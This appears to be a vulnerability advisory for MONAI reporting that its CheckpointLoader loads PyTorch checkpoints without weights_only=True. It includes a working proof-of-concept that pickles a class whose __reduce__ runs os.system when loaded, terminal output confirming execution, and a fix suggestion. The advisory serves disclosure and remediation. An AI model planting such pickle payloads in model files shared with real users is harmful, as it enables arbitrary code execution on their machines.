summary: "MONAI: Unsafe torch usage may lead to arbitrary code execution\n### Summary\nIn ```model_dict\
  \ = torch.load(full_path, map_location=torch.device(device), weights_only=True)``` in monai/bundle/scripts.py\
  \ , ```weights_only=True``` is loaded securely. However, insecure loading methods still exist\
  \ elsewhere in the project, such as when loading checkpoints.\n\nThis is a common practice\
  \ when users want to reduce training time and costs by loading pre-trained models downloaded\
  \ from platforms like huggingface.\n\nLoading a checkpoint containing malicious content can\
  \ trigger a deserialization vulnerability, leading to code execution.\n\nThe following proof-of-concept\
  \ demonstrates the issues that arise when loading insecure checkpoints.\n\n```\n\nimport os\
  \  \nimport tempfile  \nimport json  \nimport torch  \nfrom pathlib import Path  \n  \nclass\
  \ MaliciousPayload:  \n    def __reduce__(self):  \n        return (os.system, ('touch /tmp/hacker2.txt',))\
  \  \n  \ndef test_checkpoint_loader_attack():  \n\n      \n\n    temp_dir = Path(tempfile.mkdtemp())\
  \  \n    checkpoint_file = temp_dir / \"malicious_checkpoint.pt\"  \n      \n\n    malicious_checkpoint\
  \ = {  \n        'model_state_dict': MaliciousPayload(),  \n        'optimizer_state_dict':\
  \ {},  \n        'epoch': 100  \n    }  \n      \n\n    torch.save(malicious_checkpoint, checkpoint_file)\
  \  \n      \n     \n    from monai.handlers import CheckpointLoader  \n    import torch.nn\
  \ as nn  \n          \n \n    model = nn.Linear(10, 1)  \n        \n    loader = CheckpointLoader(\
  \  \n        load_path=str(checkpoint_file),  \n        load_dict={\"model\": model}  \n \
  \   )  \n          \n    class MockEngine:  \n        def __init__(self):  \n            self.state\
  \ = type('State', (), {})()  \n            self.state.max_epochs = None  \n            self.state.epoch\
  \ = 0  \n          \n    engine = MockEngine()  \n    loader(engine)  \n          \n     \
  \     \n    proof_file = \"/tmp/hacker2.txt\"  \n    if os.path.exists(proof_file):  \n  \
  \      print(\"Succes\")  \n        #os.remove(proof_file)  \n        return True  \n    else:\
  \  \n        print(\"False\")  \n        return False  \n  \nif __name__ == \"__main__\":\
  \   \n    success = test_checkpoint_loader_attack()  \n\n```\nBecause my test environment\
  \ is missing some content, an error will be reported during operation, but the operation is\
  \ still executed.\n```\nroot@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# ls /tmp\n\
  autodl.sh.log  checkpoint_pwned.txt  hacker1.txt  selenium-managersXRcjF  supervisor.sock\
  \  supervisord.pid  tmpgjp8145d  tmpi3_u3wn8  tmpjvuhwif6  tmpkocoo34q  tmpp3q8occa\nroot@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm#\
  \ python p2.py \nTraceback (most recent call last):\n  File \"/root/autodl-tmp/mmm/p2.py\"\
  , line 61, in <module>\n    success = test_checkpoint_loader_attack()  \n              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\
  \  File \"/root/autodl-tmp/mmm/p2.py\", line 48, in test_checkpoint_loader_attack\n    loader(engine)\
  \  \n    ^^^^^^^^^^^^^^\n  File \"/root/miniconda3/lib/python3.12/site-packages/monai/handlers/checkpoint_loader.py\"\
  , line 146, in __call__\n    Checkpoint.load_objects(to_load=self.load_dict, checkpoint=checkpoint,\
  \ strict=self.strict)\n  File \"/root/miniconda3/lib/python3.12/site-packages/ignite/handlers/checkpoint.py\"\
  , line 624, in load_objects\n    _tree_apply2(_load_object, to_load, checkpoint_obj)\n  File\
  \ \"/root/miniconda3/lib/python3.12/site-packages/ignite/utils.py\", line 209, in _tree_apply2\n\
  \    _tree_apply2(func, _CollectionItem.wrap(x, k, v), y[k])\n  File \"/root/miniconda3/lib/python3.12/site-packages/ignite/utils.py\"\
  , line 216, in _tree_apply2\n    return func(x, y)\n           ^^^^^^^^^^\n  File \"/root/miniconda3/lib/python3.12/site-packages/ignite/handlers/checkpoint.py\"\
  , line 613, in _load_object\n    obj.load_state_dict(chkpt_obj, **kwargs)\n  File \"/root/miniconda3/lib/python3.12/site-packages/torch/nn/modules/module.py\"\
  , line 2581, in load_state_dict\n    raise RuntimeError(\nRuntimeError: Error(s) in loading\
  \ state_dict for Linear:\n        Missing key(s) in state_dict: \"weight\", \"bias\". \n \
  \       Unexpected key(s) in state_dict: \"model_state_dict\", \"optimizer_state_dict\", \"\
  epoch\". \nroot@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# ls /tmp\nautodl.sh.log\
  \  checkpoint_pwned.txt  hacker1.txt  hacker2.txt  selenium-managersXRcjF  supervisor.sock\
  \  supervisord.pid  tmpgjp8145d  tmpi02txakb  tmpi3_u3wn8  tmpjvuhwif6  tmpkocoo34q  tmpp3q8occa\n\
  ```\n\n\n### Impact\nLeading to arbitrary command execution\n### Fix suggestion\nUse a safe\
  \ method to load, or force weights_only=True"
